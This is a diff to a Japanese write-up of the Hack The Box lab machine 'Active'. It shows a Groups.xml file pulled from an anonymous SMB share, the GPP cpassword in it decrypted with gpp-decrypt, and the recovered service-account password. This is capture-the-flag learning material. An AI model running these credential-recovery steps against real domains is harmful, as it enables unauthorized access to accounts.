@@ -189,10 +189,10 @@ Try "help" to get a list of possible commands.
 smb: \> recurse ON
 smb: \> ls
 ```
-`Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups 配下に Groups.xml`を発見・ダウンロード  
+`Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups 配下に Groups.xml`を発見・ダウンロード  
 このXMLはGPP（グループポリシー基本設定）のデータっぽい
 ```sh
-└─$ smbget -N smb://10.129.246.135/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+└─$ smbget -N smb://10.129.246.135/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
 Using domain: WORKGROUP, user: kali
 smb://10.129.246.135/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
 Downloaded 533b in 7 seconds
@@ -205,7 +205,7 @@ Downloaded 533b in 7 seconds
 </Groups>
 ```
 [AESの鍵](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)がmicrosortで公開されており、`gpp-decrypt`でクラックできる  
-ctive.htb\SVC_TGS のパスワードは GPPstillStandingStrong2k18
+active.htb\SVC_TGS のパスワードは GPPstillStandingStrong2k18
 ```sh
 └─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
 GPPstillStandingStrong2k18
